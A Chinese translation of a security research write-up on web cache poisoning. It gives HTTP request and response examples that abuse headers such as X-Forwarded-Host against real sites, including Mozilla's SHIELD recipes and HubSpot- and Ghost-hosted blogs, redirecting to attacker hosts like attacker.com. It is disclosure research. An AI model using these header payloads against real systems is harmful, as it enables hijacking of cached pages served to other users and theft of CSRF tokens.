### 国际化数据劫持与缓存投毒

在对某网站进行安全测试时，发现其JavaScript代码使用`data-site-root`属性来决定从何处加载国际化（i18n）数据。尝试通过请求`/api/i18n/en`获取英文翻译文件，但仅收到一个空的JSON响应。

然而，将语言代码从`en`改为`es`后，成功获取到了西班牙语的翻译文件：
```http
GET /api/i18n/es HTTP/1.1
Host: catalog.data.gov
HTTP/1.1 200 OK
...
{"Show more":"Mostrar más"}
```
该文件包含用于将短语翻译成用户所选语言的映射。通过创建我们自己的翻译文件并利用缓存投毒技术，可以将短语翻译变成漏洞：
```http
GET /api/i18n/en HTTP/1.1
Host: portswigger-labs.net
HTTP/1.1 200 OK
...
{"Show more":""}
```
最终结果是，任何查看包含“显示更多”文字的网页的用户都会受到攻击。

### 劫持Mozilla SHIELD

在配置了“X-Forwarded-Host”匹配/替换规则以解决上述问题后，意外地发现了另一个问题。除了与`catalog.data.gov`的交互外，还收到了一些神秘的内容：
```http
GET /api/v1/recipe/signed/ HTTP/1.1
Host: xyz.burpcollaborator.net
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: application/json
origin: null
X-Forwarded-Host: xyz.burpcollaborator.net
```
浏览器发送的`Origin: null`头部非常罕见。通过筛选代理的历史记录，发现这是Firefox试图获取一份“recipes”列表，作为SHIELD系统的一部分，用于静默安装扩展以用于营销和研究目的。该系统曾因强行分发“Mr Robot”扩展而引起争议。

通过欺骗`X-Forwarded-Host`头部，Firefox被引导到我的网站以获取`recipes`：
```http
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: xyz.burpcollaborator.net
HTTP/1.1 200 OK
{
  "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
  "action-signed": "https://xyz.burpcollaborator.net/api/v1/action/signed/",
  "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/",
  "recipe-signed": "https://xyz.burpcollaborator.net/api/v1/recipe/signed/",
  ...
}
```
这些`recipes`看起来像这样：
```json
[{
  "id": 403,
  "last_updated": "2017-12-15T02:05:13.006390Z",
  "name": "Looking Glass (take 2)",
  "action": "opt-out-study",
  "addonUrl": "https://normandy.amazonaws.com/ext/pug.mrrobotshield1.0.4-signed.xpi",
  "filter_expression": "normandy.country in ['US', 'CA'] && normandy.version >= '57.0'",
  "description": "MY REALITY IS JUST DIFFERENT THAN YOURS"
}]
```
该系统使用NGINX进行缓存，并会保存我的投毒响应并将其提供给其他用户。这可能导致数千万Firefox日常用户从我的网站上检索`recipes`。虽然Firefox使用的`recipes`有签名，但我可以通过构造特定URL来进行DDoS攻击或利用内存破坏漏洞。

我向Mozilla报告了这一问题，他们在24小时内修复了基础设施，但由于对严重程度存在分歧，只获得了1000美元的奖励。

### 路由投毒

某些应用程序不仅愚蠢地使用头部生成URL，而且无知地将它们用于内部请求路由：
```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: canary
HTTP/1.1 404 Not Found
CF-Cache-Status: MISS
...
HubSpot - Page not found
The domain canary does not exist in our system.
```
Goodhire.com显然托管在HubSpot上，而HubSpot给予`X-Forwarded-Server`比主机更高的优先级，导致请求的目标客户端感到困惑。虽然我们的输入反映在页面中，但它是HTML编码的，因此直接的XSS攻击在这里不起作用。要利用这一点，我们需要注册为HubSpot客户端，在HubSpot页面上放置有效Payload，然后欺骗HubSpot在goodhire.com上发送此响应：
```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com
HTTP/1.1 200 OK
...
```
Cloudflare愉快地缓存了此响应，并将其提供给后续访问者。在将此报告传递给HubSpot后，他们通过永久封禁我的IP地址来解决这个问题。经过一番劝说，他们最终修补了漏洞。

### 隐蔽的路由投毒

路由投毒漏洞并不总是那么明显：
```http
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: canary
HTTP/1.1 302 Found
Location: https://ghost.org/fail/
```
Cloudflare的博客由Ghost托管，显然他们正在使用`X-Forwarded-Host`头部。您可以通过指定另一个可识别的主机名（例如blog.binary.com）来避免重定向“失败”，但这只会导致奇怪的10秒延迟，然后是标准的blog.cloudflare.com响应。乍一看，并没有明确的方法来利用这一点。

当用户首次使用Ghost注册博客时，它会在ghost.io下使用唯一的子域发布它们。一旦博客启动并运行，用户就可以定义像blog.cloudflare.com这样的任意自定义域。如果用户定义了自定义域，则其ghost.io子域将只重定向到它：
```http
GET / HTTP/1.1
Host: noshandnibble.ghost.io
HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```
同样，也可以使用`X-Forwarded-Host`头部触发此重定向：
```http
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: noshandnibble.ghost.io
HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```
通过注册我的ghost.org帐户并设置自定义域名，我可以将发送到blog.cloudflare.com的请求重定向到我自己的网站：[waf.party](https://waf.party/)。这意味着我可以劫持类似图像资源的加载。然而，由于混合内容保护，浏览器会阻止`script/stylesheet`重定向。

最终，通过在[hackxor](https://hackxor.net/mission?id=7)上发布问题并附上现金奖励，找到了解决方案。Sajjad Hashemian发现，在Safari中如果waf.party在浏览器的HSTS缓存中，重定向将自动升级到HTTPS而不是被阻止。Sam Thomas则在Edge中找到了绕过混合内容保护的方法。

总而言之，对于Safari和Edge用户，我可以完全控制blog.cloudflare.com、blog.binary.com和其他所有ghost.org客户端上的每个页面。对于Chrome/Firefox用户，我只能劫持图像。

### 链接未加密的输入

有时，未加密的输入只会混淆应用程序堆栈的一部分，需要链接其他未加密的输入以实现可利用的结果。例如以下网站：
```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: xyz
HTTP/1.1 200 OK
Set-Cookie: locale=en; domain=xyz
```
`X-Forwarded-Host`头部覆盖到cookie上的域，但在响应的其余部分中没有生成任何URL。此外，还有另一个未加密的输入：
```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Scheme: nothttps
HTTP/1.1 301 Moved Permanently
Location: https://redacted.net/en
```
这两个输入单独来看都是无用的，但如果结合在一起，我们可以将响应转换为重定向到任意网址：
```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en
```
使用此技术，可以通过从自定义HTTP请求头中重定向POST请求来窃取CSRF令牌。